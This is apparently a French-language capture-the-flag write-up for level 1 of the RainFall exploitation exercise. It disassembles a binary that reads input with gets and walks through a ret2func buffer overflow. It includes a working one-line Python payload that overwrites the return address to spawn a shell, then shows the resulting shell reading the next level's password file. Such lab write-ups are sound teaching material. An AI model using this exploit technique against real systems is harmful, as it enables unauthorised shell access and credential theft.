# Level 1

Si on execute `level1` on peut voir qu'il attend un input de la part de l'utilisateur.

```bash
08048444 <run>:
8048444:	55                   	push   %ebp
8048445:	89 e5                	mov    %esp,%ebp
8048447:	83 ec 18             	sub    $0x18,%esp
804844a:	a1 c0 97 04 08       	mov    0x80497c0,%eax
804844f:	89 c2                	mov    %eax,%edx
8048451:	b8 70 85 04 08       	mov    $0x8048570,%eax
8048456:	89 54 24 0c          	mov    %edx,0xc(%esp)
804845a:	c7 44 24 08 13 00 00 	movl   $0x13,0x8(%esp)
8048461:	00 
8048462:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
8048469:	00 
804846a:	89 04 24             	mov    %eax,(%esp)
804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
804847e:	c9                   	leave  
804847f:	c3                   	ret    

08048480 <main>:
8048480:	55                   	push   %ebp
8048481:	89 e5                	mov    %esp,%ebp
8048483:	83 e4 f0             	and    $0xfffffff0,%esp
8048486:	83 ec 50             	sub    $0x50,%esp
8048489:	8d 44 24 10          	lea    0x10(%esp),%eax
804848d:	89 04 24             	mov    %eax,(%esp)
8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
8048495:	c9                   	leave  
8048496:	c3                   	ret    
8048497:	90                   	nop
8048498:	90                   	nop
8048499:	90                   	nop
804849a:	90                   	nop
804849b:	90                   	nop
804849c:	90                   	nop
804849d:	90                   	nop
804849e:	90                   	nop
804849f:	90                   	nop
```

Grace au resultat de objdump on peut s'apercevoir que:

	1- Au debut de la fonction main il reserve 88 octets pour la stack frame, dont le buffer commence a esp+0x10(16 octets), ce qui laisse 76 octets jusqu’a l’adresse de retour
	2- L'input de l'utilisateur est lu avec 'gets' => man 3 gets => section BUGS
	3- L'existence d'une fonction 'run' mais jamais appeler qui fait un appel a 'system' en argument "/bin/sh"


La technique employee est un ret2func, qui consiste a deborder le buffer jusqu’a ecraser l’adresse de retour (registre `EIP`) afin de la remplacer par l’adresse de la fonction run

Pour cela on va faire ca en une ligne avec python remplir les 76 premiers octets puis rajouter l'adresse la fonction qu'on souhaite executer dans les 4 derniers octets
```python
python -c 'print("A" * 76 + "\x44\x84\x04\x08")
```

Il nous suffit d'envoyer le resultat dans notre executable tout en ajoutant l'appel a `cat` pour garder le stdin ouvert apres l'envoie du payload

```bash
level1@RainFall:~$ (python -c 'print("A" * 76 + "\x44\x84\x04\x08")' && cat) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
************************************
```